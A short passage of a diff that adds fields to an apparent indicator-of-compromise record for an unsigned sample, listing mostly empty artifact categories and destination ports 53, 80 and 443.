+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443
+      ],
+      "mutexes": []
+    }
   }
 ]
